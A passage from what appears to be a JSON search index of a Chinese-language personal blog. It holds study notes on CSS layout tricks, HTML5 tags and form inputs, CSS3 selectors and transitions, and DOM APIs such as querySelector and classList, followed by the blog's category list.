解决图片底部默认空白空隙：图片底侧会有一个空白缝隙，原因是行内块元素会和文字的基线对齐解决方法：1.给图片添加vertical-align:middle或者top或者bottom 2.把图片转为块级元素 display:block 单行文字溢出显示省略号white-space:nomal:如果文字显示不开自动换行 white-space:nowrap:如果文字显示不开强制一行内显示 overflow:hidden(溢出部分隐藏) text-overflow:ellipsis(文字溢出部分用省略号显示) 多行文本溢出显示省略号​ width: 150px; ​ height: 65px; ​ background-color: pink; ​ margin: 100px auto; ​ overflow: hidden; ​ text-overflow: ellipsis; ​ display: -webkit-box; ​ /* 从第几行开始省略 */ ​ -webkit-line-clamp: 3; ​ -webkit-box-orient: vertical; 常见布局技巧margin负值使用让每个盒子margin往左移动-1px，正好压住相邻盒子的边框 鼠标经过盒子提高当前盒子层级（如果没有定位，则加相对定位（保留位置）如果都有定位则用z-index) 文字围绕浮动元素三角形制作 weight:0; height:0; border-color:transparent red transparent transprent; border-style:solid; border-width:22px 8px 0 0;(上面的宽，右边的小一些) HTML新标签header:头部标签 nav：导航标签 article:内容标签 section:定义文档某个区域 aside:侧边栏标签 footer：尾部标签 主要针对搜索引擎，这些新标签页面中可以使用多次，在IE9中，需要把这些元素转换为块级元素 视频用mp4格式 autoplay:自动播放 controls:向用户使用播放控件 width:设置播放器宽度 height:设置高度 loop:是否循环播放 src：url（视频url地址） poster:加载等待的画面图片 muted：静音播放 新增input表单type=”email” type=”url” type=”date” type=”time” type=”month” type=”week” type=”numbers” type=”tel” type=”search” type=”color” input属性 required=”requied”表示该内容不能为空，必填 placeholder=”placeholder”提示文本，表单提示信息 autofocus=”autofocus”自动聚焦属性，页面加载完成自动聚焦到指定表单 autocomplete：默认为on，当用户键入字段时基于之前键入的值显示出字段，关闭为off multiple:可以多选文件提交 新增选择器属性选择器E[att]选择具有att属性的E元素 E[att=”val”]选择具有att属性且属性值等于val的E元素 E[att^=”val”]选择具有att属性且属性值以val开头 E[att$=”val”]选择具有att属性且属性值中含有val的E元素 伪类选择器E:first-child:匹配父元素的第一个子元素 E:last-child:匹配父元素的最后一个元素 E:nth-child(n)匹配父元素的第n个元素 E:nth-child(even)匹配父元素的第偶数个元素，odd则第奇数个元素 E:nth-child(n)，从0开始计算，但是第0个元素或者超出元素个数会被忽略 nth-child(2n):偶数，2n+1:奇数 5n:5 10 15… n+5:从第5个开始到最后 -n+5：前5个（包含第5个） nth-of-type():会把指定孩子排序号，执行的时候先看E指定的元素，之后根据E回去看是第几个孩子 nth-child:对于父元素里面所有孩子进行排序选择，先找到第n个孩子，然后看着是否和E匹配 无序列表用nth-child比较多 类选择器，属性选择器和伪类选择器权重为10 伪元素选择器::before:在元素内部的前面插入内容 ::after:在元素内部的后面插入内容 before和after创建一个元素，属于行内元素 新创建的这个元素在文档树中找不到，因此称为伪元素 语法：element::before{}, before和after必须有content属性 伪元素和标签选择器一样，权重为1 伪元素选择器：清除浮动.clearfix:after { content:’’; display:block;//插入的元素必须是块级 height:0;//不要看见这个元素 clear:both; visibility:hidden;//不要看见这个元素 } .clearfix:before,.clearfix:after { content:’’; diaplay:table;//元素在一行显示且转化为块级元素 } CSS盒子模型box-sizing:content-box，盒子大小为width+padding+border(CSS3之前默认) box-sizing:border-box,盒子大小为width 如果盒子模型我们改为了box-sizing：border-box，那padding和border就不会撑大盒子（前提padding和border不会超过width宽度） CSS过渡（重点）transition:要过渡的属性 花费时间 运动曲线 何时开始 1属性：想要变化的CSS属性，宽度高度 背景颜色内外边距都可以 如果想要所有属性都变化过度则用all 2花费时间：单位是秒（必需写单位 3运动曲线默认为ease 4何时开始：单位是秒 可以设置延迟触发时间 默认是0s CSS filter属性修改图片的颜色为黑白 1img&#123;filter:grayscale(100%)&#125;","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"DOM扩展","slug":"DOM扩展","date":"2021-11-25T08:47:24.000Z","updated":"2021-12-30T07:17:21.260Z","comments":true,"path":"2021/11/25/DOM扩展/","link":"","permalink":"https://coloey.github.io/2021/11/25/DOM%E6%89%A9%E5%B1%95/","excerpt":"","text":"Selectors APIquerySelector()接收CSS选择符参数，返回匹配模式的第一个后代元素，如果没有匹配项则返回null 12345678let body=document.querySelector(&quot;body&quot;);//取得id名为myDiv的元素let myDiv=document.querySelector(&quot;#myDiv&quot;);//取得类名为“selector&quot;的第一个元素let selected=document.querySelector(&quot;.selected&quot;);//取得类名为&quot;button&quot;的图片let img=document.querySelector(&quot;img.button&quot;); querySelectorAll()接收一个查询参数，返回所有匹配的节点，即一个NodeList的静态实例 1234567891011//取得id为&#x27;myDiv&#x27;的&lt;div&gt;元素中的所有&lt;em&gt;元素let ems=document.getElementByid(&#x27;myDiv&#x27;).querySelectorAll(&quot;em&quot;);//取得所有类名中包含&#x27;selected&#x27;的元素let selecteds=document.querySelectorAll(&quot;.selected&quot;);//取得所有是&lt;p&gt;元素子元素的&lt;strong&gt;元素let strongs=document.querySelectorAll(&quot;p strong&quot;);for(let strong of strongs)&#123; strong.className=&quot;important&quot;; //strong.item(i).className=&quot;important&quot;; //strong[i].className=&quot;important&quot;;&#125; HTML5getElementsByClassName()接收一个参数，即包含一个或多个类名的字符串，返回类名中包含相应类的元素的NodeList 1234//取得所有类名中包含&#x27;username&#x27;和&#x27;current&#x27;元素let allCurrentUsernames=document.getElementsByClassName(&quot;username current&quot;);//取得id为“myDiv&quot;的元素子树中所有包含&#x27;selected’类的元素let selected=document.getElementById(&quot;myDiv&quot;).getElementsByClassName(&quot;selected&quot;); 这个方法返回以调用它的对象为根元素的子树中所有匹配的元素，在document上调用getElementsByClassName()返回文档中所有匹配的元素，而在特定元素中调用getElementsByClassName()返回该元素后代中匹配的元素 classList属性 add(value) contains(value) remove(value) toggle(value)：如果类名列表中已经存在指定的value，则删除，如果不存在，添加 123456div.classList.remove(&quot;disabled&quot;);div.classList.add(&quot;current&quot;);//检测类名if(div.classList.contains(&quot;bd&quot;)&amp;&amp;!div.classList.contains(&quot;disabled&quot;))&#123; &#125; 焦点管理12345let button=document.getElementById(&quot;myButton&quot;);button.focus();console.log(document.activeElement===button);console.log(document.hasFocus());//true文档已经拥有焦点","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]}],"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"},{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"},{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"},{"name":"WebSocket","slug":"WebSocket","permalink":"https://coloey.github.io/categories/WebSocket/"},{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"},{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Vue","slug":"Node/Vue","permalink":"https://coloey.github.io/categories/Node/Vue/"},{"name":"HTTP","slug":"HTTP","permalink":"https://coloey.github.io/categories/HTTP/"},{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"HTML5","slug":"Node/HTML5","permalink":"https://coloey.github.io/categories/Node/HTML5/"},{"name":"git","slug":"git","permalink":"https://coloey.github.io/categories/git/"},{"name":"vim","slug":"vim","permalink":"https://coloey.github.io/categories/vim/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"},{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[{"name":"watch","slug":"watch","permalink":"https://coloey.github.io/tags/watch/"}]}